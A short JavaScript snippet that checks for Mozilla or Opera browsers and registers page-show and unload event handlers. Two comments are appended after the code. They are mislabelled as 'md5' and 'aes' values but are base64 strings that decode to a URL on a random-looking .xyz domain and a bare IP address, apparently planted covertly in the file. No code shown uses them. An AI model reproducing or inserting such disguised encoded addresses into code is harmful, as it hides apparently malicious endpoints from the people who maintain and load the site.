if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovL3d3dy5mY3hkc3NuZmZ2YmRlZ2JzdjI3Lnh5ei93YXAvIy9vcGVuYWNjb3VudA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/